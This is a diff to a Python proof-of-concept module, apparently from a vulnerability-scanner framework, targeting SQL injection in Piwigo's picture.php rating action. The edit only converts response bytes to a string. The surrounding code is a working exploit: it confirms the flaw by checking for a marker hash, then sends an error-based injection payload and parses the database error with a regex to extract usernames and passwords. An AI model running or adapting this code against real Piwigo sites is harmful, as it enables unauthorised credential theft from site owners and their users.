@@ -60,7 +60,7 @@ class Poc(ABPoc):
                 target=self.target)+"/piwigo/picture.php?/1/category/1&action=rate"
             request = urllib.request.Request(verify_url, payload)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if '8e2873ed66791d114792734402de17f7' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -82,7 +82,7 @@ class Poc(ABPoc):
                        "CHARACTER_SETS GROUP BY x)a)")
             request = urllib.request.Request(vul_url, payload)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             pattern = re.compile(
                 r'.*?Duplicate entry \'(?P<username>[^<>]*?):(?P<password>[^<>]*?)1\' for key \'group_key\'', re.I | re.S)
             match = pattern.match(content)
